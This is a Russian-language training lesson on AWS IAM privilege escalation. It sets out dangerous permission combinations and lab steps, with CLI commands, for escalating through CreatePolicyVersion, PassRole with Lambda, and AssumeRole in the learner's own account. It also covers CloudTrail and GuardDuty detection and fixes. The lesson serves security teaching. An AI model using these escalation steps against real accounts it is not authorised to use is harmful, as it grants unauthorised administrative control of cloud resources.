# 16.1 — AWS IAM и privesc

> **M16 · Этап 3 · 6 ч · 🔴 · артефакт:** `labs/m16-cloud-k8s/l01-aws/`

## Цель

Понять модель AWS IAM и научиться находить пути повышения привилегий: `iam:PassRole`, `sts:AssumeRole`, `iam:CreatePolicyVersion`, `lambda:UpdateFunctionCode`.

## Результат

- Карта IAM-пользователей/ролей/политик.
- 3 рабочих пути privesc (в своём аккаунте).
- Список детектов CloudTrail.

## Теория

### 1. Модель

- **Principal** — пользователь/роль/сервис.
- **Policy** — JSON с `Effect`, `Action`, `Resource`, `Condition`.
- **Role** — набор прав, который можно «надеть» через `AssumeRole`.
- **Trust policy** — кто может принять роль.
- **Permission boundary** — верхняя граница прав.

### 2. Как читать политику

```json
{
  "Effect": "Allow",
  "Action": ["s3:GetObject", "s3:PutObject"],
  "Resource": "arn:aws:s3:::bucket/*"
}
```

Опасные сочетания:

- `iam:PassRole` + `ec2:RunInstances` → роль на EC2.
- `iam:PassRole` + `lambda:CreateFunction` → роль на Lambda.
- `iam:CreatePolicyVersion` → переписать политику.
- `iam:AttachUserPolicy` → прикрепить admin.
- `sts:AssumeRole` на роль с `*`.
- `s3:GetObject` на бакет с секретами.

### 3. Инструменты

```bash
aws sts get-caller-identity
aws iam list-users
aws iam list-attached-user-policies --user-name alice
aws iam get-policy-version --policy-arn <arn> --version-id v1
```

`Pacu`, `enumerate-iam`, `ScoutSuite`, `PMapper` — автоматизация.

### 4. Пример: PassRole → Lambda

```bash
aws lambda create-function --function-name pwn \
  --runtime python3.12 --role arn:aws:iam::123:role/AdminRole \
  --handler index.handler --zip-file fileb://payload.zip
aws lambda invoke --function-name pwn out.json
```

Ожидаемо: код выполняется с правами `AdminRole`.

### 5. Детект

CloudTrail: `CreateFunction`, `PassRole`, `CreatePolicyVersion`, `AttachUserPolicy`, `AssumeRole` аномалии. GuardDuty: `PrivilegeEscalation`, `CredentialAccess`. Config: rules на public buckets.

## Лаборатория

> Свой AWS-аккаунт (free tier) или LocalStack. Никаких чужих аккаунтов.

### 1. Контекст

```bash
aws sts get-caller-identity
aws iam list-users --query 'Users[].UserName'
```

### 2. Политики

```bash
aws iam list-attached-user-policies --user-name lab-user
aws iam list-user-policies --user-name lab-user
```

Ожидаемо: политики lab-user.

### 3. Path 1: CreatePolicyVersion

Если есть право:

```bash
aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default
```

Ожидаемо: политика стала admin. Проверьте `aws iam list-attached-user-policies`.

### 4. Path 2: PassRole + Lambda

Создайте функцию с ролью, у которой больше прав. Ожидаемо: выполнение от имени роли.

### 5. Path 3: AssumeRole

```bash
aws sts assume-role --role-arn arn:aws:iam::123:role/Target --role-session-name test
```

Ожидаемо: временные креды. Проверьте `get-caller-identity`.

### 6. Детект

```bash
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreatePolicyVersion
```

Ожидаемо: ваши события. Запишите.

## Атака и защита

- **Атака:** цепочка прав → роль с большими правами.
- **Детект:** CloudTrail, GuardDuty, anomaly detection.
- **Фикс:** least privilege, permission boundaries, SCP, MFA, Access Analyzer, запрет `PassRole` на `*`.

## Самопроверка

- [ ] Что такое trust policy?
- [ ] Почему `iam:PassRole` опасен?
- [ ] Чем роль отличается от пользователя?
- [ ] Какие события CloudTrail искать?
- [ ] Что такое permission boundary?

## Дальше

[16.2 — Azure/Entra ID](l02-azure-entra.md)
